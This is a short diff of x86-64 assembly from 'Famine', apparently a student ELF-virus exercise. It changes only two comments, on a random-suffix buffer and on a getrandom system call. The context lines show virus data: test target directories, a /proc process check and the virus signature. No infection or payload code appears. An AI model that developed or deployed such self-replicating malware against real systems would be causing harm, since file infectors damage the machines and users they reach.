@@ -336,7 +336,7 @@ v_secondDir:      db "/tmp/test2", 0
 %endif
 v_signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 0
 v_signature_len:  equ $ - v_signature - 1
-v_random_suffix:  times RANDOM_SUFFIX_LEN db 0  ; Buffer for random suffix
+v_random_suffix:  times RANDOM_SUFFIX_LEN db 0  ; Stores generated random alphanumeric suffix
 v_procdir:        db "/proc/", 0
 v_proc_status:    db "/status", 0
 v_proc_test_string: db "Name:	test", 10
@@ -395,7 +395,7 @@ virus_generate_random_suffix:
     mov eax, SYS_GETRANDOM
     lea rdi, [r15 + v_random_suffix - virus_start]
     mov esi, RANDOM_SUFFIX_LEN
-    xor edx, edx                ; flags = 0 (default)
+    xor edx, edx                ; flags = 0 (use /dev/urandom, non-blocking)
     syscall
 
     ; Convert each byte to alphanumeric character
